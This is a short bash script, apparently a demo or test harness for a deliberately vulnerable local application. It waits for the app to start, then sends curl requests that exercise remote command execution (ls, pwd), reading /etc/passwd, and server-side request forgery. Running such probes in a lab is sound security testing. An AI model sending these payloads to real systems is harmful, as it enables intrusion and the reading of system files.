#!/bin/bash
NONE='\033[00m'
GREEN='\033[01;32m'
RED='\033[01;31m'
BLUE='\033[0;34m'

for ((i=1;i<=30;i++));
do
   response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/)
   if [[ $response -eq 200 ]]; then
     echo  -e "${BLUE}Application started ${NONE} \n"
     break
   fi
   echo -e "${BLUE}Waiting for Application to start...${NONE}"
   sleep 10
done

echo -e "${GREEN}Step 3: LAUNCHING THE ATTACK! ${NONE}"
echo -e "${GREEN}Firing curl request to execute attack ${NONE}"


if [[ ( $1 == "all" ) ]]; then
# Unary RCE
curl 'http://localhost:3000/rce?payload=ls'

# Unary File Read
curl 'http://localhost:3000/fileread?payload=/etc/passwd'

# server streaming RCE
curl 'http://localhost:3000/rce-stream?payload=pwd'

# client streaming SSRF
curl 'http://localhost:3000/ssrf?payload=http://google.com'

# duplex streaming File Read
curl 'http://localhost:3000/fileAccess?payload=/etc/passwd'
fi